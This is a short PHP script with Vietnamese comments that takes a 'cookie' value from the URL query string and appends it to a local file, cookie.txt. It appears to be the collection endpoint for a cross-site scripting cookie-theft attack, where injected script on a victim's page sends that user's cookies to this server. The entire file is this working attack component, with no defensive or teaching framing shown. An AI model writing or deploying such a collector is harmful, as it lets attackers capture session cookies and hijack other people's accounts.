<?php
if (!empty($_GET['cookie'])) {
    // file_put_contents('cookie.txt', $_GET['cookie']);
    $cookie = $_GET['cookie'];
    $openwrite = fopen('cookie.txt', 'a');
    // Ghi giá trị cookie
    fwrite($openwrite, "Cookie la: " . $cookie . " \n");
    // Đóng file lại
    fclose($openwrite);
}
